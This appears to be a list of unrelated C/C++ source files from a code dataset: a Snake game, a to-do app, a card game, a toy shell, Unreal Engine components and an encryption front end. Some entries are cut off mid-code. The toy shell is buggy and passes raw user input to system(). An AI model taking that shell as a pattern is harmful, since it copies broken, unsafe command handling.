    "#ifdef __APPLE__\n#include <GLUT/glut.h>\n#else\n#include <GL/glut.h>\n#endif\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <math.h>\n#include <locale.h>\n#define NUM_SEGMENTS 100\n\n\n/**\n * @file\n * @brief Prosty Snake Game w OpenGL.\n */\n\n/**\n * @brief Struktura przechowuj\u0105ca wsp\u00f3\u0142rz\u0119dne kwadrat\u00f3w tworz\u0105cych cia\u0142o w\u0119\u017ca oraz wska\u017anik na poprzedzaj\u0105cy kwadrat.\n */\nstruct snake_body{\n\n    snake_body *prev;\n    float lbx;\n    float lby;\n    float rbx;\n    float rby;\n    float lux;\n    float luy;\n    float rux;\n    float ruy;\n};\n\n\n\n/**\n * Zmienna przechowuj\u0105ca informacj\u0119 o koordynatach x pokarmu.\n */\nint x;\n\n/**\n * Zmienna przechowuj\u0105ca informacj\u0119 o koordynatach y pokarmu.\n */\nint y;\n\n/**\n * Flaga okre\u015blaj\u0105ca, czy gra jest zako\u0144czona.\n * Je\u015bli warto\u015b\u0107 wynosi 1, gra si\u0119 zako\u0144czy\u0142a.\n */\nint game_over = 0;\n\n/**\n * Flaga okre\u015blaj\u0105ca, czy sterowanie jest w\u0142\u0105czone.\n * Je\u015bli warto\u015b\u0107 wynosi 1, sterowanie jest w\u0142\u0105czone.\n */\nint isControlEnabled = 1;\n\n/**\n * Zmienna przechowuj\u0105ca wynik gracza.\n */\nint score = 0;\n\n/**\n * Sta\u0142a okre\u015blaj\u0105ca szeroko\u015b\u0107 okna.\n */\nconst int windowWidth = 800;\n\n/**\n * Sta\u0142a okre\u015blaj\u0105ca wysoko\u015b\u0107 okna.\n */\nconst int windowHeight = 800;\n\n/**\n * Sta\u0142a okre\u015blaj\u0105ca rozmiar siatki gry.\n */\nconst int gridSize = 50;\n\n/**\n * Zmienna okre\u015blaj\u0105ca aktualne menu.\n * Warto\u015bci:\n * 0 - ekran pocz\u0105tkowy,\n * 1 - gra w trakcie,\n * 2 - ekran gry,\n * 3 - ekran ko\u0144cowy.\n */\nint menu = 0;\n\n/**\n * Zmienna okre\u015blaj\u0105ca aktualny kierunek poruszania si\u0119 w\u0119\u017ca.\n * Warto\u015bci:\n * 1 - g\u00f3ra,\n * 2 - d\u00f3\u0142,\n * 3 - prawo,\n * 4 - lewo.\n */\nint direction = 1;\n\n\n\n/**\n * Wska\u017anik na pierwszy element kolejki reprezentuj\u0105cej cia\u0142o w\u0119\u017ca.\n */\nsnake_body *header;\n\n/**\n * Wska\u017anik na drugi element kolejki reprezentuj\u0105cej cia\u0142o w\u0119\u017ca.\n */\nsnake_body *second;\n\n/**\n * Wska\u017anik na trzeci element kolejki reprezentuj\u0105cej cia\u0142o w\u0119\u017ca.\n */\nsnake_body *third;\n\n/**\n * Wska\u017anik na ostatni element kolejki reprezentuj\u0105cej cia\u0142o w\u0119\u017ca.\n */\nsnake_body *last;\n\n/**\n * Wska\u017anik pomocniczy wykorzystywany do iteracji po elementach kolejki reprezentuj\u0105cej cia\u0142o w\u0119\u017ca.\n */\nsnake_body *elem;\n\n\n\n\n\n\n/**\n * @brief Funkcja odpowiedzialna za wyznaczanie nowych wsp\u00f3\u0142rz\u0119dnych pokarmu. Wyznacza ona dwie losowe wsp\u00f3\u0142rz\u0119dne i por\u00f3wnuje je ze wsp\u00f3\u0142rz\u0119dnymi wszystkich kwadrat\u00f3w tworz\u0105cych w\u0119\u017ca. Je\u015bli wsp\u00f3\u0142rz\u0119dne nachodz\u0105 na siebie losuje nowe.\n */\nvoid generate_food(){\n\nint check = 0;\n\nsnake_body *current = last;\n\ndo {\n    x = rand()%97 - 48;\n    y = rand()%97 - 48;\n    current = last;\n    check = 0;\n    while(current->prev != NULL){\n        if(fabs(x-((current->rbx + current->lbx)/2)) <= 4 && fabs(y-((current->rby+current->ruy)/2) <= 4)){\n           check = 1;\n           break;\n    }\n    current = current->prev;\n}\n} while(check==1);\n\n\n}\n\n\n\n\n\n\n/**\n * @brief Funkcja odpowiedzialna za inicjalizacj\u0119 w\u0119\u017ca. Alokuje ona pami\u0119\u0107 dla trzech kwadrat\u00f3w, wyznaczaj\u0105c im wsp\u00f3\u0142rz\u0119dne na \u015brodku ekranu. Przypisuje ona do wska\u017anika last adres trzeciego kwadratu. Na koniec wywo\u0142uje ona funkcj\u0119 generate_food tworz\u0105c\u0105 pokarm.\n*/\nvoid initialize_snake(){\n\n    header = (snake_body *)malloc(sizeof(snake_body));\n    header->lbx = -2;\n    header->lby = -2;\n    header->rbx = 2;\n    header->rby = -2;\n    header->lux = -2;\n    header->luy = 2;\n    header->rux = 2;\n    header->ruy = 2;\n    header->prev = NULL;\n\n    second = (snake_body *)malloc(sizeof(snake_body));\n    second->prev = header;\n    second->lbx = -2;\n    second->lby = -6;\n    second->rbx = 2;\n    second->rby = -6;\n    second->lux = -2;\n    second->luy = -2;\n    second->rux = 2;\n    second->ruy = -2;\n\n    third = (snake_body *)malloc(sizeof(snake_body));\n    third->prev = second;\n    third->lbx = -2;\n    third->lby = -10;\n    third->rbx = 2;\n    third->rby = -10;\n    third->lux = -2;\n    third->luy = -6;\n    third->rux = 2;\n    third->ruy = -6;\n\n    score = 0;\n    last = third;\n\n\n    generate_food();\n}\n\n\n\n\n\n\n\n/**\n * @brief Funkcja odpowiedzialna za dodanie nowego kwadratu na ko\u0144cu w\u0119\u017ca. Alokuje ona pami\u0119\u0107 na struktur\u0119 snake_body, przypisuje do wska\u017anika new_tail, kt\u00f3ry zostaje dodany do kolejki przechowuj\u0105cej cia\u0142o w\u0119\u017ca.\n*/\nvoid add_tail(){\n\n    snake_body *new_tail = (snake_body *)malloc(sizeof(snake_body));\n    *new_tail = *last;\n    new_tail->prev = last;\n    last = new_tail;\n\n}\n\n\n\n\n\n\n\n/**\n * @brief Funkcja odpowiedzialna za rysowanie kwadratu b\u0119d\u0105cego cz\u0119\u015bci\u0105 w\u0119\u017ca. Jako parametr przyjmuje ona wska\u017anik do ostatniego elementu kolejki. W funkcji nadany zostaje kolor kwadratu. Nast\u0119pnie przypisuje si\u0119 mu wsp\u00f3\u0142rz\u0119dne przekazanego wska\u017anika.\n*\n* @param s Wska\u017cnik na ostatni element kolejki.\n*/\nvoid draw_quad(struct snake_body *s){\n    glBegin(GL_QUADS);\n    glColor3f(0.2, 0.6, 1);\n    glVertex2f(s->lbx, s->lby);\n    glVertex2f(s->rbx, s->rby);\n    glVertex2f(s->rux, s->ruy);\n    glVertex2f(s->lux, s->luy);\n    glEnd();\n}\n\n\n\n\n\n\n/**\n * @brief Funkcja odpowiedzialna za rysowanie pokarmu. Funkcja korzysta ze wsp\u00f3\u0142rz\u0119dnych x i y wyznaczonych przez funkcj\u0119 generate_food() i na ich podstawie rysuje ko\u0142o w odpowiednim kolorze w odpowiednim miejscu ekranu.\n*/\nvoid dr",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\n\r\nint ID;  // To track the ID of tasks\r\n\r\n// Custom type for tasks with ID and task description\r\nstruct Todo {\r\n    int id;\r\n    string task;\r\n};\r\n\r\n// Add New Task Method\r\nvoid addTodo() {\r\n    system(\"cls\");\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t                       WELCOME TO Your TODO List                       \" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl << endl << endl;\r\n    \r\n    Todo todo;\r\n    cout << \"\\n\\tEnter new task: \";\r\n    cin.get();\r\n    getline(cin, todo.task);\r\n    ID++; \r\n\r\n    // Write this task to the todo.txt file\r\n    ofstream write(\"todo.txt\", ios::app);\r\n    write << \"\\n\" << ID;\r\n    write << \"\\n\" << todo.task;\r\n    write.close();\r\n\r\n    // Update the ID file\r\n    ofstream idFile(\"id.txt\");\r\n    idFile << ID;\r\n    idFile.close();\r\n\r\n    char ch;\r\n    cout << \"\\n\\tDo you want to add more tasks? (y or n): \";\r\n    cin >> ch;\r\n\r\n    if (ch == 'y') {\r\n        addTodo();\r\n    } else {\r\n        cout << \"\\n\\tTask has been added successfully.\";\r\n    }\r\n}\r\n\r\n// Display Added Tasks Method\r\nvoid print(const Todo& s) {\r\n    cout << \"\\tID: \" << s.id;\r\n    cout << \"\\tTask: \" << s.task << endl;\r\n}\r\n\r\n// Read Added Tasks from todo.txt Method\r\nvoid readData() {\r\n    system(\"cls\");\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t                       WELCOME TO Your TODO List                       \" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl << endl << endl;\r\n    \r\n    Todo todo;\r\n    ifstream read(\"todo.txt\");\r\n    cout << \"\\n\\t\\t\\t------------------Your current tasks in the list--------------------\" << endl;\r\n    \r\n    while (read >> todo.id) {\r\n        read.ignore();\r\n        getline(read, todo.task);\r\n        print(todo);\r\n    }\r\n    read.close();\r\n}\r\n\r\n// Search for a specific task from the todo.txt file Method\r\nint searchData() {\r\n    system(\"cls\");\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t                       WELCOME TO Your TODO List                       \" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl << endl << endl;\r\n\r\n    int id;\r\n    cout << \"\\n\\tEnter task ID: \";\r\n    cin >> id;\r\n    Todo todo;\r\n    ifstream read(\"todo.txt\");\r\n    \r\n    while (read >> todo.id) {\r\n        read.ignore();\r\n        getline(read, todo.task);\r\n        if (todo.id == id) {\r\n            print(todo);\r\n            return id;\r\n        }\r\n    }\r\n    read.close();\r\n    return -1; // Return -1 if not found\r\n}\r\n\r\n// Delete Task Method\r\nvoid deleteData() {\r\n    system(\"cls\");\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t                       WELCOME TO Your TODO List                       \" << endl;\r\n    cout << \"\\t\\t\\t                                                                        \" << endl;\r\n    cout << \"\\t\\t\\t***********************************************************************\" << endl << endl << endl;\r\n\r\n    int id = searchData();\r\n    if (id == -1) {\r\n        cout << \"\\n\\tTask ID not found.\";\r\n        return;\r\n    }\r\n\r\n    cout << \"\\n\\tDo you want to delete this task? (y or n): \";\r\n    char choice;\r\n    cin >> choice;\r\n    if (choice == 'y') {\r\n        Todo todo;\r\n        ofstream tempFile(\"temp.txt\");\r\n        ifstream read(\"todo.txt\");\r\n\r\n        while (read >> todo.id) {\r\n            read.ignore();\r\n            getline(read, todo.task);\r\n            if (todo.id != id) {\r\n                tempFile << \"\\n\" << todo.id;\r\n                tempFile << \"\\n\" << todo.task;\r\n            }\r\n        }\r\n        read.close();\r\n        tempFile.close();\r\n        remove(\"todo.txt\");\r\n        rename(\"temp.txt\", \"todo.txt\");\r\n        cout << \"\\n\\tTask deleted successfully.\";\r\n    } else {\r\n        cout << \"\\n\\tRecord not deleted.\";\r\n    }\r\n}\r\n\r\n// Main Function\r\nint main() {\r\n    system(\"cls\");\r\n    s",
    "#include <iostream>\r\n#include <iomanip> \r\nusing namespace std;\r\nvoid printHand(const int* hand, int size, int player) {\r\n    cout << \"Player \" << player << \"'s hand: \";\r\n    for (int i = 0; i < size; ++i) {\r\n        cout << setw(3) << hand[i] << \" \";\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint calculateSum(const int* arr, int size) {\r\n    int sum = 0;\r\n    for (int i = 0; i < size; ++i) {\r\n        sum += arr[i];\r\n    }\r\n    return sum;\r\n}\r\n\r\nint main() {\r\n    int deck[52] = { 1,2,3,4,5,6,0,8,9,10,0,10,10,1,2,3,4,5,6,0,8,9,10,0,10,10,1,2,3,4,5,6,0,8,9,10,0,10,10,1,2,3,4,5,6,0,8,9,10,0,10,10 };\r\n    int p1[5], p2[5], p3[5], p4[5], index = 0, open, player = 1, max_index;\r\n\r\n    for (int i = 0; i < 5; ++i) {\r\n        p1[i] = deck[index++];\r\n        p2[i] = deck[index++];\r\n        p3[i] = deck[index++];\r\n        p4[i] = deck[index++];\r\n    }\r\n    open = deck[index++];\r\n\r\n   \r\n    while (index < 52) {\r\n        int* currentPlayerHand = nullptr;\r\n        string playerName;   \r\n        switch (player) {\r\n        case 1:\r\n            currentPlayerHand = p1;\r\n            playerName = \"Player 1\";\r\n            break;\r\n        case 2:\r\n            currentPlayerHand = p2;\r\n            playerName = \"Player 2\";\r\n            break;\r\n        case 3:\r\n            currentPlayerHand = p3;\r\n            playerName = \"Player 3\";\r\n            break;\r\n        case 4:\r\n            currentPlayerHand = p4;\r\n            playerName = \"Player 4\";\r\n            break;\r\n        }\r\n\r\n        printHand(currentPlayerHand, 5, player);\r\n        cout << \"Current open card: \" << open << endl;\r\n\r\n        int max = currentPlayerHand[0];\r\n        max_index = 0;\r\n        for (int i = 1; i < 5; ++i) {\r\n            if (currentPlayerHand[i] > max) {\r\n                max = currentPlayerHand[i];\r\n                max_index = i;\r\n            }\r\n        }\r\n        if (max > open) {\r\n            cout << playerName << \" decides to swap \" << max << \" with \" << open << \".\" << endl;\r\n            swap(currentPlayerHand[max_index], open);\r\n        }\r\n        else {\r\n            cout << playerName << \" decides not to swap. Drawing a new card.\" << endl;\r\n            open = deck[index++];\r\n            if (max > open) {\r\n                cout << playerName << \" swaps \" << max << \" with the new card \" << open << \".\" << endl;\r\n                swap(currentPlayerHand[max_index], open);\r\n            }\r\n            else {\r\n                cout << \"The new card \" << open << \" is not better than \" << max << \".\" << endl;\r\n            }\r\n        }\r\n        player = (player % 4) + 1;\r\n        cout << \"--------------------------------------\" << endl;\r\n    }\r\n\r\n    int sum1 = calculateSum(p1, 5);\r\n    int sum2 = calculateSum(p2, 5);\r\n    int sum3 = calculateSum(p3, 5);\r\n    int sum4 = calculateSum(p4, 5);\r\n\r\n    int minSum = min({ sum1, sum2, sum3, sum4 });\r\n\r\n    cout << \"Final hands:\" << endl;\r\n    printHand(p1, 5, 1);\r\n    printHand(p2, 5, 2);\r\n    printHand(p3, 5, 3);\r\n    printHand(p4, 5, 4);\r\n\r\n    cout << \"Total sums:\" << endl;\r\n    cout << \"Player 1 sum: \" << sum1 << endl;\r\n    cout << \"Player 2 sum: \" << sum2 << endl;\r\n    cout << \"Player 3 sum: \" << sum3 << endl;\r\n    cout << \"Player 4 sum: \" << sum4 << endl;\r\n\r\n    cout << \"Minimum sum among all players is = \" << minSum << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <regex>\n#include <filesystem>\n#include <string>\n#include <fstream>\n#include <cstring>\n#include <unistd.h>\n#include <sstream>\n#include <cstdio>\n#include <cstdlib>\n\nint find_files() {\n    // TODO: make output more readable\n    std::filesystem::path cwd = std::filesystem::current_path();\n\n    for (const auto & entry : std::filesystem::directory_iterator(cwd))\n        std::cout << entry.path() << std::endl;\n\n    return 0;\n};\n\nint read_file(char* filename) {\n    \n    std::string line;\n    std::ifstream readfile;\n\n    readfile.open(filename);\n\n    while (std::getline ( readfile, line )) {\n        std::cout << line << std::endl;\n\n    };\n    readfile.close();\n\n    return 0;\n};\n\nchar * str_to_char(std::string str) {\n        int length = str.length();\n        char *char_str = new char [length + 1];\n\n        strcpy(char_str, str.c_str());\n        return char_str;\n}\n\nvoid save_output(char** args) {\n    std::ofstream commandfile (\"command-history.txt\");\n\n    commandfile << args;\n\n    commandfile.close();\n};\n\nint main(int argc, char** argv) {\n    \n    while (1) {\n        std::cout << \"> \";  \n\n\n        std::regex characters (\"[^a-zA-Z0-9/.*!#(){}=+-~]+\");\n\n        // if (std::regex_match(arg1, characters)) {\n        //    std::cout << \"Unknown output\" << std::endl;;\n        // };\n\n        \n        // TODO make this more efficient \n        \n        //for (int i = 0 ; i >= argc ; i++){\n        save_output(argv);  \n        //}\n        \n        \n        if (argc == 1) {\n            if (argv[0] == \"ls\") {\n                find_files();\n            }; \n            if (argv[0] == \"pwd\") {\n                std::cout << std::filesystem::current_path() << std::endl;\n            };\n        }; \n        \n        if (argc == 2) {\n            if (argv[0] == \"cat\") {\n                read_file(argv[1]);\n            };\n            if (argv[0] == \"echo\") {\n                std::cout << argv[1];\n            };\n            if (argv[0] == \"cd\") {\n                chdir(argv[1]);\n            };\n            if (argv[0] == \"run\") {\n                std::ostringstream oss;\n                oss << \"chmod +x \" << argv[1];\n                std::string chmod_string = oss.str();\n                system(str_to_char(chmod_string));\n\n                std::ostringstream oss2;\n                oss2 << \"./\" << argv[1];\n                std::string exec_string = oss.str();\n                system(str_to_char(exec_string));\n            };\n            if (argv[0] == \"touch\") {\n                std::ofstream outfile (argv[1]);\n            };\n            if (argv[0] == \"mkdir\") {\n                std::filesystem::create_directories(argv[1]);\n            };\n            if (argv[0] == \"rm\") {\n                std::remove(argv[1]);\n            };\n\n\n        };\n\n        if (argc == 3 && argv[1] == \">\") {\n            //TODO add error handling\n            auto input = system(argv[0]);\n\n            std::ofstream outfile (argv[2]);\n\n            outfile << input;\n\n            outfile.close();\n        };\n\n\n       \n    return 0;\n    \n    };\n};\n",
    "#include \"CoverIdentifier.h\"\n\n#include \"AIController.h\"\n#include \"Engine/StaticMeshActor.h\"\n#include \"Kismet/KismetMathLibrary.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n\nvoid UCoverIdentifier::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tCombatBehaviour = GetOwner()->FindComponentByClass<UCombatBehaviour>();\n\n\tif (AAIController* AIController = Cast<AAIController>(Cast<APawn>(GetOwner())->GetController()); !AIController)\n\t{\n\t\tAIController = GetWorld()->SpawnActor<AAIController>();\n\t\tAIController->Possess(Cast<APawn>(GetOwner()));\n\t}\n}\n\nvoid UCoverIdentifier::IdentifyCover()\n{\n\tif (CombatBehaviour->CurrentTarget)\n\t{\n\t\tGroupedCoverSpots.Empty();\n\t\tUWorld* World = GetWorld();\n\t\tif (!World) return;\n\t\t\n\t\tFVector OwnerLocation = GetOwner()->GetActorLocation();\n\t\tFVector CurrentTargetLocation = CombatBehaviour->CurrentTarget->GetActorLocation();\n\n\t\tif (TArray<FOverlapResult> OutOverlaps; PerformOverlapBoxTrace(World, OwnerLocation, CurrentTargetLocation, OutOverlaps))\n\t\t{\n\t\t\t// get an array of static meshes that are between the NPC and it's target\n\t\t\tTArray<AStaticMeshActor*> CoverMeshes;\n\t\t\tfor (const FOverlapResult& OverlapResult : OutOverlaps)\n\t\t\t{\n\t\t\t\tif (OverlapResult.GetActor() && OverlapResult.GetActor()->IsA(AStaticMeshActor::StaticClass()))\n\t\t\t\t{\n\t\t\t\t\tAStaticMeshActor* MeshActor = Cast<AStaticMeshActor>(OverlapResult.GetActor());\n\n\t\t\t\t\t// if we want to trim meshes that are further away than the player, uncomment this\n\t\t\t\t\t// FVector MeshActorLocation;\n\t\t\t\t\t// MeshActor->GetStaticMeshComponent()->GetClosestPointOnCollision(OwnerLocation, MeshActorLocation);\n\t\t\t\t\t// if (FVector::Dist(MeshActorLocation, CurrentTargetLocation) > FVector::Dist(OwnerLocation, CurrentTargetLocation)) continue;\n\t\t\t\t\t\n\t\t\t\t\tif (MeshActor && !CoverMeshes.Contains(MeshActor))\n\t\t\t\t\t{\n\t\t\t\t\t\tCoverMeshes.Add(MeshActor);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// iterate over each mesh and identify the best cover spots\n\t\t\tfor (int i = 0; i < CoverMeshes.Num(); i++)\n\t\t\t{\n\t\t\t\tAStaticMeshActor* MeshActor = CoverMeshes[i];\n\t\t\t\tUStaticMeshComponent* StaticMeshComponent = MeshActor->GetStaticMeshComponent();\n\t\t\t\t\n\t\t\t\tFBox ClosestFace;\n\t\t\t\tTMap<FVector, float> CoverSpots;\n\t\t\t\tFVector ClosestFaceCenter = GetClosestFaceCenter(StaticMeshComponent, OwnerLocation, ClosestFace, 100, CoverSpots, CurrentTargetLocation);\n\n\t\t\t\tGroupedCoverSpots.Add(ClosestFaceCenter, CoverSpots);\n\t\t\t\t\n\t\t\t\tFTransform ActorTransform = MeshActor->GetActorTransform();\n\t\t\t\t\n\t\t\t\tFBox OrientedBoundingBox = GetComponentOrientedBoundingBox(MeshActor->GetStaticMeshComponent());\n\t\t\t\t\n\t\t\t\t// draw a debug box around the identified static mesh\n\t\t\t\tDrawDebugBox(World, OrientedBoundingBox.GetCenter(), OrientedBoundingBox.GetExtent(), ActorTransform.GetRotation(), FColor::Green, false, 0.0f, 0, 5.0f);\n\t\t\t\t\n\t\t\t\t// draw a debug box around the valid cover zone\n\t\t\t\tDrawDebugBox(World, ClosestFaceCenter, ClosestFace.GetExtent(), ActorTransform.GetRotation(), FColor::Yellow, false, 0.0f, 0, 5.0f);\n\t\t\t\t\n\t\t\t\tfor (auto& CoverSpot : CoverSpots)\n\t\t\t\t{\n\t\t\t\t\tfloat Alpha = FMath::Clamp(CoverSpot.Value, 0.0f, 1.0f);\n\n\t\t\t\t\t// draw a debug sphere at each of the valid cover spots\n\t\t\t\t\tDrawDebugSphere(GetWorld(), CoverSpot.Key, 100.0f, 32, FMath::Lerp(FLinearColor::Red, FLinearColor::Green, Alpha).ToFColor(true), false, 0.0f);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tDrawDebugLine(World, OwnerLocation, CurrentTargetLocation, FColor::Yellow, false, 1.0f);\n\t\t}\n\t}\n}\n\n/**\n *\tGets the center of the face on a given static mesh that is most openly facing the Point\n *\tusing the normal of the face compared to the dot product of the vector to the point\n * \n * @param StaticMeshComponent \n * @param Point \n * @return \n */\nFVector UCoverIdentifier::GetClosestFaceCenter(UStaticMeshComponent* StaticMeshComponent, const FVector& Point, FBox& ClosestFace, float SuppliedDepth, TMap<FVector, float>& CoverSpots, FVector TargetLocation)\n{\n\tif (!StaticMeshComponent)\n    {\n        return FVector::ZeroVector;\n    }\n\t\n    // Get the local bounding box of the static mesh\n    FBox LocalBoundingBox = StaticMeshComponent->GetStaticMesh()->GetBoundingBox();\n\t\n    // Calculate centers of all 6 faces of the bounding box in local space\n    FVector LocalFaceCenters[6];\n    LocalFaceCenters[0] = FVector((LocalBoundingBox.Min.X + LocalBoundingBox.Max.X) * 0.5f, LocalBoundingBox.Min.Y, (LocalBoundingBox.Min.Z + LocalBoundingBox.Max.Z) * 0.5f); // Min Y face\n    LocalFaceCenters[1] = FVector((LocalBoundingBox.Min.X + LocalBoundingBox.Max.X) * 0.5f, LocalBoundingBox.Max.Y, (LocalBoundingBox.Min.Z + LocalBoundingBox.Max.Z) * 0.5f); // Max Y face\n    LocalFaceCenters[2] = FVector(LocalBoundingBox.Min.X, (LocalBoundingBox.Min.Y + LocalBoundingBox.Max.Y) * 0.5f, (LocalBoundingBox.Min.Z + LocalBoundingBox.Max.Z) * 0.5f); // Min X face\n    LocalFaceCenters[3] = FVector(LocalBoundingBox.Max.X, (LocalBoundingBox.Min.Y + LocalBoundingBox.Max.Y) * 0.5f, (LocalBoundingBox.Min.Z + LocalBoundingBox.Max.Z) * 0.5f); // Max X face\n    LocalFaceCenters[4] = FVector((LocalBoundingBox.Min.X + LocalBoun",
    "#include \"RoomRotatorComponent.h\"\n#include \"Kismet/KismetMathLibrary.h\"\n\nURoomRotatorComponent::URoomRotatorComponent()\n{\n\tPrimaryComponentTick.bCanEverTick = true;\n\n\tm_CurrentRotation = 0.0f;\n\tm_IsRotating = false;\n\n\tComponentTags.Add(TEXT(\"Rotator\"));\n}\n\n\nvoid URoomRotatorComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n}\n\n\nvoid URoomRotatorComponent::TickComponent(float DeltaTime, ELevelTick TickType, FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\tif (m_IsRotating)\n\t{\n\t\tPerformRotation(DeltaTime);\n\t}\n}\n\n\nvoid URoomRotatorComponent::RotateRooms(TArray<AActor*> RoomsToRotate, FVector RotationPoint, FVector RotationAxis, RotationDirection rotationDir)\n{\n\tif (m_IsRotating) return;\n\n\tm_Rooms = RoomsToRotate;\n\tm_RotationPoint = RotationPoint;\n\tm_RotationAxis = RotationAxis;\n\tm_CurrentRotation = 0.0f;\n\tm_IsRotating = true;\n\tm_RotationDirection = int(rotationDir);\n\n\tm_RotationAxis.Normalize();\n\n\t_OnRotationStarted.Broadcast();\n}\n\n\nvoid URoomRotatorComponent::PerformRotation(float DeltaTime)\n{\n\tfloat RotationThisFrame = RotationSpeed * DeltaTime * m_RotationDirection;\n\tm_CurrentRotation += RotationThisFrame;\n\n\tif (abs(m_CurrentRotation) >= 90.0f)\n\t{\n\t\tRotationThisFrame -= (m_CurrentRotation - 90.0f);\n\t\t_OnRotationCompleted.Broadcast();\n\t\tm_IsRotating = false;\n\t}\n\n\tfor (AActor* Room : m_Rooms)\n\t{\n\t\tif (!Room) continue;\n\n\t\tFVector RoomLocation = Room->GetActorLocation();\n\t\tFVector ToRoom = RoomLocation - m_RotationPoint;\n\t\tToRoom = ToRoom.RotateAngleAxis(RotationThisFrame, m_RotationAxis);\n\t\tRoomLocation = m_RotationPoint + ToRoom;\n\n\t\tFQuat RotationQuat = FQuat(m_RotationAxis, FMath::DegreesToRadians(RotationThisFrame));\n\t\tFQuat NewRotation = RotationQuat * Room->GetActorRotation().Quaternion();\n\n\t\tRoom->SetActorLocationAndRotation(RoomLocation, NewRotation, false, nullptr, ETeleportType::TeleportPhysics);\n\t}\n\n\tif (!m_IsRotating)\n\t{\n\t\tm_CurrentRotation = 0.0f;\n\t}\n}\n\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <limits>\n#include \"novacrypt.hpp\"\n\nvoid novaCryptInit(std::string text, int SECURE_KEY, int SALT, int MODE, std::vector<std::string> filePaths = {});\nstd::string getFileContent(const std::string &filePath);\nvoid saveFileContent(const std::string &filePath, const std::string &content);\n\nint main()\n{\n    std::string textContent;\n    int SECURE_KEY = 0, MODE = 0, SALT = 0;\n    std::vector<std::string> filePaths(2);\n\n    do\n    {\n        std::cout << \"To Encrypt & Decrypt Data Choose the Mode for Example: (1)Encryption (2)Decryption (31)Encrypt File (32)Decrypt File \\n\";\n        std::cout << \"Enter MODE (1/2/31/32) : \";\n        std::cin >> MODE;\n        std::cout << \"Enter SECURE_KEY(int) : \";\n        std::cin >> SECURE_KEY;\n        std::cout << \"Enter SALT(int) : \";\n        std::cin >> SALT;\n        std::cout << std::endl;\n    } while (SECURE_KEY == 0 && MODE == 0 && SALT == 0);\n\n    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n\n    if (MODE == 1 || MODE == 2)\n    {\n        std::cout << \"Enter the content: \";\n        std::getline(std::cin, textContent);\n    }\n    else if (MODE == 31 || MODE == 32)\n    {\n        std::cout << \"Enter File Path for Encryption (Source): \";\n        std::getline(std::cin, filePaths[0]);\n        std::cout << \"Enter File Path for Decryption (Destination): \";\n        std::getline(std::cin, filePaths[1]);\n    }\n\n    std::cout << std::endl;\n    novaCryptInit(textContent, SECURE_KEY, SALT, MODE, filePaths);\n\n    return 0;\n}\n\nvoid novaCryptInit(std::string text, int SECURE_KEY, int SALT, int MODE, std::vector<std::string> filePaths)\n{\n    // Initialize NovaCrypt with provided text, SECURE_KEY, SALT, and MODE\n    NovaCrypt cryption(SECURE_KEY, SALT);\n\n    if (MODE == 1)\n    {\n        std::string encrypted = cryption.encrypt(text);\n        std::cout << \"Encrypted Data: \" << encrypted << std::endl;\n    }\n    else if (MODE == 2)\n    {\n        std::string decrypted = cryption.decrypt(text);\n        std::cout << \"Decrypted Data: \" << decrypted << std::endl;\n    }\n    else if (MODE == 31)\n    {\n        std::string fileContents = getFileContent(filePaths[0]);\n        std::string encryptedData = cryption.encrypt(fileContents);\n        saveFileContent(filePaths[1], encryptedData);\n        std::cout << \"Encrypted data saved to: \" << filePaths[1] << std::endl;\n    }\n    else if (MODE == 32)\n    {\n        std::string fileContents = getFileContent(filePaths[0]);\n        std::string decryptedData = cryption.decrypt(fileContents);\n        saveFileContent(filePaths[1], decryptedData);\n        std::cout << \"Decrypted data saved to: \" << filePaths[1] << std::endl;\n    }\n}\n\nstd::string getFileContent(const std::string &filePath)\n{\n    std::ifstream file(filePath);\n    if (!file.is_open())\n    {\n        std::cerr << \"Could not open the file: \" << filePath << std::endl;\n        exit(1);\n    }\n\n    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n    file.close();\n    return content;\n}\n\nvoid saveFileContent(const std::string &filePath, const std::string &content)\n{\n    std::ofstream file(filePath);\n    if (!file.is_open())\n    {\n        std::cerr << \"Could not open the file: \" << filePath << std::endl;\n        exit(1);\n    }\n\n    file << content;\n    file.close();\n}\n",
